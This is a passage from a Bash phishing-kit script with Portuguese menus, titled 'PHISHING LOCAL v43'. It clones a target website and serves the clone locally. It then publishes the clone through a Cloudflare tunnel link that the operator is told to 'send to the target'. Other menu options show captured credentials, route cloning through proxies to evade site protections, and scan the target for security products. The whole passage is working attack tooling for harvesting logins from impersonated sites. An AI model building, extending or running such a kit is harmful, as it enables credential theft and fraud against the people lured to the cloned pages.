        rm -f "$SCRIPT_DIR/.server.pid"; read; return
    fi

    local my_ip=$(get_my_ip)
    local port=8080
    local url="http://${my_ip}:${port}"

    echo -e "  ${GREEN}Status:${NC}  ON"
    echo -e "  ${GREEN}PID:${NC}     ${pid}"
    echo -e "  ${GREEN}IP:${NC}      ${my_ip}"
    echo -e "  ${GREEN}Porta:${NC}   ${port}"
    echo -e "  ${GREEN}URL:${NC}     ${url}"
    echo ""
    echo -e "${YELLOW}1) Abrir no browser${NC}"
    echo -e "${YELLOW}Enter) Voltar${NC}"
    echo -n "> "
    read CHOICE

    if [ "$CHOICE" = "1" ]; then
        if command -v termux-am &>/dev/null; then
            termux-am start -a android.intent.action.VIEW -d "$url" 2>/dev/null
            echo -e "${GREEN}[OK] Aberto!${NC}"
        elif command -v xdg-open &>/dev/null; then
            xdg-open "$url" 2>/dev/null
            echo -e "${GREEN}[OK] Aberto!${NC}"
        else
            echo -e "${YELLOW}  Acesse: $url${NC}"
        fi
        read
    fi
}

# =============================================
# LINK DO TUNEL
# =============================================
show_tunnel_link() {
    clear
    echo -e "${CYAN}  ═══════════════════════════════════════${NC}"
    echo -e "${CYAN}         LINK DO TUNEL${NC}"
    echo -e "${CYAN}  ═══════════════════════════════════════${NC}"
    echo ""

    local tunnel_url=$(cat "$SCRIPT_DIR/.tunnel_link" 2>/dev/null)

    if [ -z "$tunnel_url" ] && [ -f "$TUNNEL_LOG" ]; then
        tunnel_url=$(grep -oE 'https://[a-zA-Z0-9.-]+\.trycloudflare\.com' "$TUNNEL_LOG" 2>/dev/null | head -1)
    fi

    if [ -n "$tunnel_url" ] && [ "$tunnel_url" != "" ]; then
        echo -e "${GREEN}  ================================${NC}"
        echo -e "  Link: ${WHITE}$tunnel_url${NC}"
        echo -e "${GREEN}  ================================${NC}"
        echo ""
        echo -e "  ${YELLOW}Mand pro alvo!${NC}"
    else
        echo -e "${RED}  Sem tunel ativo.${NC}"
        echo -e "${YELLOW}  Crie com opcao 3.${NC}"
    fi

    echo ""
    echo -e "${YELLOW}1) Recriar${NC}"
    echo -e "${YELLOW}Enter) Voltar${NC}"
    echo -n "> "
    read CHOICE

    [ "$CHOICE" = "1" ] && start_tunnel
}

# =============================================
# STATUS
# =============================================
show_status() {
    clear
    echo -e "${CYAN}  ═══════════════════════════════════════${NC}"
    echo -e "${CYAN}         STATUS DO SISTEMA${NC}"
    echo -e "${CYAN}  ═══════════════════════════════════════${NC}"
    echo ""

    echo -n "  Node:    "; command -v node &>/dev/null && echo -e "${GREEN}OK${NC}" || echo -e "${RED}NO${NC}"
    echo -n "  Curl:    "; command -v curl &>/dev/null && echo -e "${GREEN}OK${NC}" || echo -e "${RED}NO${NC}"
    echo -n "  Proxy:   "; command -v proxychains4 &>/dev/null && echo -e "${GREEN}OK${NC}" || echo -e "${YELLOW}NO${NC}"
    echo -n "  Cloud:   "; command -v cloudflared &>/dev/null && echo -e "${GREEN}OK${NC}" || echo -e "${YELLOW}NO${NC}"
    echo -n "  Ver:     ${WHITE}v42${NC}"
    echo ""

    # Processos
    echo ""
    echo -e "  ${PURPLE}Processos:${NC}"
    echo -n "  Servidor: "; [ -f "$SCRIPT_DIR/.server.pid" ] && kill -0 "$(cat $SCRIPT_DIR/.server.pid)" 2>/dev/null && echo -e "${GREEN}ON (PID $(cat $SCRIPT_DIR/.server.pid))${NC}" || echo -e "${RED}OFF${NC}"
    echo -n "  Tunel:    "; [ -f "$SCRIPT_DIR/.tunnel.pid" ] && kill -0 "$(cat $SCRIPT_DIR/.tunnel.pid)" 2>/dev/null && echo -e "${GREEN}ON${NC}" || echo -e "${RED}OFF${NC}"

    # Clone atual
    if [ -d "$SITE_DIR" ] && [ -f "$SITE_DIR/index.html" ]; then
        local sz=$(wc -c < "$SITE_DIR/index.html" 2>/dev/null | tr -d ' ')
        local css=$(find "$SITE_DIR" -name "css_*" -type f 2>/dev/null | wc -l)
        local js=$(find "$SITE_DIR" -name "js_*" -type f 2>/dev/null | wc -l)
        local assets=$(find "$SITE_DIR" -name "asset_*" -type f 2>/dev/null | wc -l)
        local total_sz=$(du -sh "$SITE_DIR" 2>/dev/null | cut -f1)
        local tot_files=$(find "$SITE_DIR" -type f 2>/dev/null | wc -l)

        echo ""
        echo -e "  ${PURPLE}Clone atual:${NC}"
        echo -e "  URL:     ${WHITE}$(cat "$SCRIPT_DIR/.last_url" 2>/dev/null | cut -d'|' -f1 || echo '?')${NC}"
        echo -e "  Total:   ${GREEN}${total_sz}${NC} (${tot_files} arquivos)"
        echo -e "  HTML:    ${WHITE}${sz} bytes${NC}"
        echo -e "  CSS:     ${css} | JS: ${js} | Assets: ${assets}"

        local is_spa=$(grep -qiE '<app-root|_nghost|__NEXT_DATA__|data-reactroot|ng-version|vue-router' "$SITE_DIR/index.html" 2>/dev/null && echo 1 || echo 0)
        local ext=$(grep -oE '(src|href)="https?://[^"]*"' "$SITE_DIR/index.html" 2>/dev/null | grep -v 'localhost\|127\.0\.0\.1' | wc -l | tr -d ' ')
        local title=$(grep -oE '<title>[^<]+</title>' "$SITE_DIR/index.html" 2>/dev/null | sed 's/<[^>]*>//g' | head -1)
        [ -n "$title" ] && echo -e "  Titulo:   ${WHITE}${title}${NC}"

        if [ "$is_spa" = "1" ]; then
            echo -e "  Tipo:    ${RED}SPA (conteudo via JS)${NC}"
        elif [ "$css" -eq 0 ]; then
            echo -e "  Tipo:    ${YELLOW}sem CSS${NC}"
        elif [ "$js" -eq 0 ]; then
            echo -e "  Tipo:    ${WHITE}estatico${NC}"
        else
            echo -e "  Tipo:    ${GREEN}completo${NC}"
        fi
        [ "$ext" -gt 0 ] && echo -e "  ${YELLOW}Links externos restantes: ${ext}${NC}"

        # Erros do curl
        local curl_err=0; [ -f "$SCRIPT_DIR/curl.log" ] && curl_err=$(grep -ci "could not\|error\|timeout\|failed" "$SCRIPT_DIR/curl.log" 2>/dev/null || echo 0)
        if [ "$curl_err" -gt 0 ]; then
            echo ""
            echo -e "  ${RED}Ultimos erros curl:${NC}"
            grep -i "could not\|error\|timeout\|failed" "$SCRIPT_DIR/curl.log" 2>/dev/null | tail -3 | while read l; do echo -e "    ${RED}${l}${NC}"; done
        fi

        # Server.log
        if [ -f "$SCRIPT_DIR/server.log" ]; then
            local srv_err=$(grep -ci "error" "$SCRIPT_DIR/server.log" 2>/dev/null || echo 0)
            if [ "$srv_err" -gt 0 ]; then
                echo ""
                echo -e "  ${RED}Ultimo erro do servidor:${NC}"
                grep -i "error" "$SCRIPT_DIR/server.log" 2>/dev/null | tail -2 | while read l; do echo -e "    ${RED}${l}${NC}"; done
            fi
        fi
    else
        echo ""
        echo -e "  ${RED}Sem clone atual${NC}"
    fi

    # Capturas
    local caps=0; [ -f "$LOG_FILE" ] && caps=$(wc -l < "$LOG_FILE" 2>/dev/null | tr -d ' ')
    echo ""
    echo -e "  Capturas: ${GREEN}${caps}${NC}"

    # Ultimo clone do historico
    if [ -f "$SCRIPT_DIR/.history" ]; then
        echo ""
        echo -e "  ${PURPLE}Ultimos clones:${NC}"
        tail -3 "$SCRIPT_DIR/.history" 2>/dev/null | while IFS='|' read -r u r p t d; do
            echo -e "    ${WHITE}${u}${NC} (${p}) - ${t}"
        done
    fi

    # Espaco em disco
    local disk_avail=$(df -h "$SCRIPT_DIR" 2>/dev/null | tail -1 | awk '{print $4}' || echo "?")
    echo ""
    echo -e "  Disco liv: ${WHITE}${disk_avail}${NC}"
    echo ""
    echo -e "${YELLOW}Press Enter...${NC}"
    read
}

# =============================================
# PARAR
# =============================================
stop_all() {
    [ -f "$SCRIPT_DIR/.server.pid" ] && kill $(cat "$SCRIPT_DIR/.server.pid") 2>/dev/null && rm -f "$SCRIPT_DIR/.server.pid"
    [ -f "$SCRIPT_DIR/.tunnel.pid" ] && kill $(cat "$SCRIPT_DIR/.tunnel.pid") 2>/dev/null && rm -f "$SCRIPT_DIR/.tunnel.pid"
    pkill -f "node.*server.js" 2>/dev/null
    pkill -f cloudflared 2>/dev/null
    echo -e "${GREEN}[OK] Tudo parado.${NC}"
}

# =============================================
# PROXY CLONE
# =============================================
do_proxy_clone() {
    clear
    echo -e "  ═══════════════════════════════════════"
    echo -e "        PROXY CLONE"
    echo -e "  ═══════════════════════════════════════"
    echo ""

    local pc_conf=""
    [ -f "$HOME/.proxychains/proxychains.conf" ] && pc_conf="$HOME/.proxychains/proxychains.conf"
    [ -z "$pc_conf" ] && [ -f "/data/data/com.termux/files/home/.proxychains/proxychains.conf" ] && pc_conf="/data/data/com.termux/files/home/.proxychains/proxychains.conf"

    if ! command -v proxychains4 &>/dev/null; then
        echo -e "${YELLOW}  Instalando proxychains-ng...${NC}"
        pkg install -y proxychains-ng 2>/dev/null || { echo -e "${RED}  Falha!${NC}"; read; return; }
    fi

    if [ -z "$pc_conf" ]; then
        echo -e "${YELLOW}  Sem config. Crie:${NC}"
        echo -e "${WHITE}  ~/.proxychains/proxychains.conf${NC}"
        echo "[ProxyList]"
        echo "http IP PORTA"
        echo ""
        echo -n "  Proxy (IP:PORTA): "
        read MANUAL_PROXY
        [ -z "$MANUAL_PROXY" ] && { read; return; }
        mkdir -p "$HOME/.proxychains"
        cat > "$HOME/.proxychains/proxychains.conf" << EOF
strict_dns
[ProxyList]
http $MANUAL_PROXY
EOF
    fi

    echo -e "${GREEN}  Proxy ativo!${NC}"
    echo ""
    echo -e "${YELLOW}URL:${NC} "
    read URL
    [ -z "$URL" ] && return
    echo "$URL" | grep -q "^http" || URL="https://$URL"

    echo -e "${YELLOW}Redirect (Enter = mesma):${NC} "
    read REDIR
    [ -z "$REDIR" ] && REDIR="$URL"

    echo -e "${YELLOW}Porta (Enter = 8080):${NC} "
    read PT
    [ -z "$PT" ] && PT=8080

    clone_site "$URL" "$REDIR" "$PT" "y"
}

# =============================================
# MENU
# =============================================
while true; do
    clear
    echo -e "  ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗"
    echo -e "  ██╔══██╗██║  ██║██║██╔════╝██║  ██║"
    echo -e "  ███████║███████║██║███████╗███████║"
    echo -e "  ██╔═══╝ ██╔══██║██║╚════██║██╔══██║"
    echo -e "  ██║     ██║  ██║██║███████║██║  ██║"
    echo -e "  ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝"
    echo ""
    echo -e "  🎣 PHISHING LOCAL ${CYAN}v43${NC}"
    echo ""
    echo "  ─────────────────────────────────────────"
    echo ""
    echo -e "  🎣 1) PHISH      - Clonar e iniciar"
    echo -e "  📋 2) CAPTURAS  - Ver credenciais"
    echo -e "  🌐 3) TÚNEL     - Link público"
    echo -e "  📜 4) HISTÓRICO - Reusar clones"
    echo -e "  📍 5) LOCALHOST - IP e abrir browser"
    echo -e "  🔗 6) LINK      - Link do túnel"
    echo -e "  📊 7) STATUS    - Sistema"
    echo -e "  🛑 8) PARAR     - Desligar"
    echo -e "  🔓 9) PROXY     - Clonar com proxy"
    echo ""
    echo -e "  ❌ 0) SAIR"
    echo ""
    echo -e "  ${CYAN}Escolha: ${NC}"
    read OP

    case $OP in
        1)
            clear
            echo -e "  ═══ PHISH ═══"
            echo ""
            echo -e "${YELLOW}URL:${NC} "
            read URL
            [ -z "$URL" ] && continue
            echo "$URL" | grep -q "^http" || URL="https://$URL"

            # SCAN ANTES DE CLONAR
            echo -e "${YELLOW}[...] Escaneando site...${NC}"
            local scan_result=$(scan_site "$URL")
            local scan_fw=$(echo "$scan_result" | cut -d"#" -f1)
            local scan_cms=$(echo "$scan_result" | cut -d"#" -f2)
            local scan_sec=$(echo "$scan_result" | cut -d"#" -f3)
            local scan_title=$(echo "$scan_result" | cut -d"#" -f5)

            echo ""
            echo -e "  ${PURPLE}╔═══════════════════════════════════╗${NC}"
            echo -e "  ${PURPLE}║        SCAN DO SITE                ║${NC}"
            echo -e "  ${PURPLE}╚═══════════════════════════════════╝${NC}"
            echo -e "  Titulo:   ${WHITE}${scan_title}${NC}"
            echo -e "  Framework: ${YELLOW}${scan_fw}${NC}"
            [ -n "$scan_cms" ] && echo -e "  CMS:       ${CYAN}${scan_cms}${NC}"
            [ -n "$scan_sec" ] && echo -e "  Seguranca: ${RED}${scan_sec}${NC}"
            echo ""

            # Detectar se precisa de proxy
            need_proxy="0"
            if [ "$scan_fw" = "Angular" ] || [ "$scan_fw" = "Next.js" ] || [ "$scan_fw" = "React" ] || [ "$scan_fw" = "Vue" ]; then
                echo -e "  ${RED}⚠ SPA detectado!${NC}"
                echo -e "  ${YELLOW}  Angular/Next/React/Vue = 100% JS${NC}"
                echo -e "  ${YELLOW}  Clone real NAO e possivel sem proxy/VPN${NC}"
                need_proxy="1"
            fi
            if [ -n "$scan_sec" ] && [ "$scan_sec" != "CDN/Proxy" ]; then
                echo -e "  ${RED}⚠ Protecao detectada: ${scan_sec}${NC}"
                echo -e "  ${YELLOW}  Site pode estar bloqueando acesso${NC}"
                need_proxy="1"
            fi

            if [ "$need_proxy" = "1" ]; then
                echo ""
                echo "  ${YELLOW}Usar proxy? (s/n): ${NC}"
                read PROXY_ANSWER
                use_proxy="n"
                echo "$PROXY_ANSWER" | grep -qi "^[sy]" && use_proxy="y"
            else
                use_proxy="n"
                echo -n "  Porta (Enter = 8080): "
                read PT
                [ -z "$PT" ] && PT=8080
            fi

            # Rescan com proxy se necessario
            if [ "$use_proxy" = "y" ]; then
                echo -e "${YELLOW}  Re-scaneando com proxy...${NC}"
                scan_result=$(scan_site "$URL" "y" 2>/dev/null)
                scan_fw=$(echo "$scan_result" | cut -d'#' -f1)
                scan_cms=$(echo "$scan_result" | cut -d'#' -f2)
                scan_sec=$(echo "$scan_result" | cut -d'#' -f3)
                scan_title=$(echo "$scan_result" | cut -d'#' -f5)
                echo -e "  Nova tentativa: ${scan_fw}"
                echo -n "  Porta (Enter = 8080): "
                read PT
                [ -z "$PT" ] && PT=8080
            fi

            # Redirect
            echo -n "  Redirect (Enter = mesma): "
            read REDIR
            [ -z "$REDIR" ] && REDIR="$URL"

            # CLONAR
            echo ""
            echo -e "  ${WHITE}╔═══════════════════════════════════════╗${NC}"
            echo -e "  ${WHITE}║        CLONANDO SITE...               ║${NC}"
            echo -e "  ${WHITE}╚═══════════════════════════════════════╝${NC}"
            echo ""

            # Salvar hora do inicio
            readonly CLONE_START=$(date +%s)

            clone_site "$URL" "$REDIR" "$PT" "$use_proxy"

            readonly CLONE_END=$(date +%s)
            readonly CLONE_ELAPSED=$((CLONE_END - CLONE_START))

            # Resultado
            echo ""
            echo -e "  ${PURPLE}╔═══════════════════════════════════════╗${NC}"
            echo -e "  ${PURPLE}║          RESULTADO DO CLONE          ║${NC}"
            echo -e "  ${PURPLE}╚═══════════════════════════════════════╝${NC}"

            local clone_sz=$(du -sh "$SITE_DIR" 2>/dev/null | cut -f1)
            local html_sz=0; [ -f "$SITE_DIR/index.html" ] && html_sz=$(stat -c%s "$SITE_DIR/index.html" 2>/dev/null || echo 0)
            local css_c=$(find "$SITE_DIR" -name "css_*" -type f 2>/dev/null | wc -l)
            local js_c=$(find "$SITE_DIR" -name "js_*" -type f 2>/dev/null | wc -l)
            local as_c=$(find "$SITE_DIR" -name "asset_*" -type f 2>/dev/null | wc -l)
            local srv_state="OFF"; [ -f "$SCRIPT_DIR/.server.pid" ] && kill -0 "$(cat $SCRIPT_DIR/.server.pid)" 2>/dev/null && srv_state="ON"

            echo -e "  Tempo:    ${WHITE}${CLONE_ELAPSED}s${NC}"
            [ -n "$clone_sz" ] && echo -e "  Total:    ${GREEN}${clone_sz}${NC}"
            [ "$html_sz" -gt 0 ] && echo -e "  HTML:     ${GREEN}${html_sz} bytes${NC}"
            [ "$css_c" -gt 0 ] && echo -e "  CSS:      ${GREEN}${css_c} arquivos${NC}"
            [ "$js_c" -gt 0 ] && echo -e "  JS:       ${GREEN}${js_c} arquivos${NC}"
            [ "$as_c" -gt 0 ] && echo -e "  Assets:   ${GREEN}${as_c} arquivos${NC}"
            echo -e "  Servidor: ${srv_state}"

            local curl_err=$(grep -ci "error\|curl" "$SCRIPT_DIR/curl.log" 2>/dev/null || echo 0)
            [ "$curl_err" -gt 0 ] && echo -e "  ${YELLOW}Erros curl: ${curl_err}${NC}"

            echo ""
            echo -e "${YELLOW}Press Enter...${NC}"
            read
            ;;


        2) view_capturas ;;
        3) start_tunnel ;;
        4) show_history ;;
        5) show_localhost ;;
        6) show_tunnel_link ;;
        7) show_status ;;
        8) stop_all; read ;;
        9) do_proxy_clone ;;
        0) stop_all; exit 0 ;;
        *) echo -e "${RED}Invalido!${NC}" ;;
    esac
done
